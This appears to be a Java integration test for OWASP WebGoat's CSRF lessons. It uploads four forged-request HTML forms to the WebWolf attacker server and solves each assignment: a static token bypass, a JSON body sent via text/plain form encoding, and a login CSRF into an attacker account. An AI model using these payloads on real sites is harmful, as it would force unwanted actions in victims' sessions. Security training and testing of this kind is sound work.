package org.owasp.webgoat;

import static org.junit.Assert.assertEquals;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

import org.junit.Test;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;

public class CSRFTest extends IntegrationTest {
	
	private static final String trickHTML3 = "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" method=\"POST\">\n" + 
			"<input type=\"hidden\" name=\"csrf\" value=\"thisisnotchecked\"/>\n" + 
			"<input type=\"submit\" name=\"submit\" value=\"assignment 3\"/>\n" + 
			"</form></body></html>";
	
	private static final String trickHTML4 = "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" method=\"POST\">\n" + 
			"<input type=\"hidden\" name=\"reviewText\" value=\"hoi\"/>\n" + 
			"<input type=\"hidden\" name=\"starts\" value=\"3\"/>\n" + 
			"<input type=\"hidden\" name=\"validateReq\" value=\"2aa14227b9a13d0bede0388a7fba9aa9\"/>\n" + 
			"<input type=\"submit\" name=\"submit\" value=\"assignment 4\"/>\n" + 
			"</form>\n" + 
			"</body></html>";
    
	private static final String trickHTML7 = "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" enctype='text/plain' method=\"POST\">\n" + 
			"<input type=\"hidden\" name='{\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat is the best!!' value='\"}' />\n" + 
			"<input type=\"submit\" value=\"assignment 7\"/>\n" + 
			"</form></body></html>";
	
	private static final String trickHTML8 = "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" method=\"POST\">\n" + 
			"<input type=\"hidden\" name=\"username\" value=\"csrf-USERNAME\"/>\n" + 
			"<input type=\"hidden\" name=\"password\" value=\"password\"/>\n" + 
			"<input type=\"hidden\" name=\"matchingPassword\" value=\"password\"/>\n" + 
			"<input type=\"hidden\" name=\"agree\" value=\"agree\"/>\n" + 
			"<input type=\"submit\" value=\"assignment 8\"/>\n" + 
			"</form></body></html>";
	
    private String webwolfFileDir;
	
	
    @Test
    public void runTests() throws IOException {
        startLesson("CSRF");
        
        webwolfFileDir = getWebWolfServerPath();
        
        //Assignment 3
        uploadTrickHtml("csrf3.html", trickHTML3.replace("WEBGOATURL", url("/csrf/basic-get-flag")));
        checkAssignment3(callTrickHtml("csrf3.html"));
        
        //Assignment 4
        uploadTrickHtml("csrf4.html", trickHTML4.replace("WEBGOATURL", url("/csrf/review")));
        checkAssignment4(callTrickHtml("csrf4.html"));
        
        //Assignment 7
        uploadTrickHtml("csrf7.html", trickHTML7.replace("WEBGOATURL", url("/csrf/feedback/message")));
        checkAssignment7(callTrickHtml("csrf7.html"));
        
        //Assignment 8
        uploadTrickHtml("csrf8.html", trickHTML8.replace("WEBGOATURL", url("/login")).replace("USERNAME", getWebgoatUser()));
        checkAssignment8(callTrickHtml("csrf8.html"));
        
        login();//because old cookie got replaced and invalidated
        checkResults("csrf");
        
    }
    
    private void uploadTrickHtml(String htmlName, String htmlContent) throws IOException {
    	
    	//remove any left over html
    	Path webWolfFilePath = Paths.get(webwolfFileDir);
        if (webWolfFilePath.resolve(Paths.get(getWebgoatUser(),htmlName)).toFile().exists()) {
        	Files.delete(webWolfFilePath.resolve(Paths.get(getWebgoatUser(),htmlName)));
        }
        
    	//upload trick html
        RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("WEBWOLFSESSION", getWebWolfCookie())
        .multiPart("file", htmlName, htmlContent.getBytes())
        .post(webWolfUrl("/WebWolf/fileupload"))
        .then()
        .extract().response().getBody().asString();
    }
    
    private String callTrickHtml(String htmlName) {
    	String result = RestAssured.given()
    	        .when()
    	        .relaxedHTTPSValidation()
    	        .cookie("JSESSIONID", getWebGoatCookie())
    	        .cookie("WEBWOLFSESSION", getWebWolfCookie())
    	        .get(webWolfUrl("/files/"+getWebgoatUser()+"/"+htmlName))
    	        .then()
    	        .extract().response().getBody().asString();
    	result = result.substring(8+result.indexOf("action=\""));
    	result = result.substring(0, result.indexOf("\""));
    	
    	return result;
    }
    
    private void checkAssignment3(String goatURL) {
    	
    	String flag = RestAssured.given()
            	.when()
            	.relaxedHTTPSValidation()
            	.cookie("JSESSIONID", getWebGoatCookie())
            	.header("Referer", webWolfUrl("/files/fake.html"))
            	.post(goatURL)
            	.then()
            	.extract().path("flag").toString();
        	
    	Map<String, Object> params = new HashMap<>();
        params.clear();
        params.put("confirmFlagVal", flag);
        checkAssignment(url("/WebGoat/csrf/confirm-flag-1"), params, true);
    }
    
    private void checkAssignment4(String goatURL) {
    	
    	Map<String, Object> params = new HashMap<>();
        params.clear();
        params.put("reviewText", "test review");
        params.put("stars", "5");
        params.put("validateReq", "2aa14227b9a13d0bede0388a7fba9aa9");//always the same token is the weakness
    	
    	boolean result = RestAssured.given()
            	.when()
            	.relaxedHTTPSValidation()
            	.cookie("JSESSIONID", getWebGoatCookie())
            	.header("Referer", webWolfUrl("/files/fake.html"))
            	.formParams(params)
            	.post(goatURL)
            	.then()
            	.extract().path("lessonCompleted");
    	assertEquals(true, result);
        	
    }
    
    private void checkAssignment7(String goatURL) {
    	
    	Map<String, Object> params = new HashMap<>();
        params.clear();
        params.put("{\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat is the best!!", "\"}");
       
    	String flag = RestAssured.given()
            	.when()
            	.relaxedHTTPSValidation()
            	.cookie("JSESSIONID", getWebGoatCookie())
            	.header("Referer", webWolfUrl("/files/fake.html"))
            	.contentType(ContentType.TEXT)
            	.body("{\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat is the best!!"+ "=\"}")
            	.post(goatURL)
            	.then()
            	.extract().asString();
    	flag = flag.substring(9+flag.indexOf("flag is:"));
    	flag = flag.substring(0, flag.indexOf("\""));

    	params.clear();
        params.put("confirmFlagVal", flag);
        checkAssignment(url("/WebGoat/csrf/feedback"), params, true);
        	
    }
    
    private void checkAssignment8(String goatURL) {
    	
    	//first make sure there is an attack csrf- user
    	registerCSRFUser();
    	
    	Map<String, Object> params = new HashMap<>();
        params.clear();
        params.put("username", "csrf-"+getWebgoatUser());
        params.put("password","password");
        	
        //login and get the new cookie
    	String newCookie = RestAssured.given()
            	.when()
            	.relaxedHTTPSValidation()
            	.cookie("JSESSIONID", getWebGoatCookie())
            	.header("Referer", webWolfUrl("/files/fake.html"))
            	.params(params)
            	.post(goatURL)            	
            	.then()
            	.extract().cookie("JSESSIONID");
  
    	//select the lesson
    	RestAssured.given()
        	.when()
        	.relaxedHTTPSValidation()
        	.cookie("JSESSIONID", newCookie)
        	.get(url("CSRF.lesson.lesson"))
        	.then()
        	.statusCode(200);
    	
    	//click on the assignment
    	boolean result = RestAssured.given()
            	.when()
            	.relaxedHTTPSValidation()
            	.cookie("JSESSIONID", newCookie)
            	.post(url("/csrf/login"))            	
            	.then()
            	.statusCode(200)
            	.extract().path("lessonCompleted");
    	
    	//vaidate the result
    	assertEquals(true, result);
        	
    }
    
    /**
     * Try to register the new user. Ignore the result.
     */
    public void registerCSRFUser() {
    	
       RestAssured.given()
                    .when()
                    .relaxedHTTPSValidation()
                    .formParam("username", "csrf-"+getWebgoatUser())
                    .formParam("password", "password")
                    .formParam("matchingPassword", "password")
                    .formParam("agree", "agree")
                    .post(url("register.mvc"));
        
    }
    
}
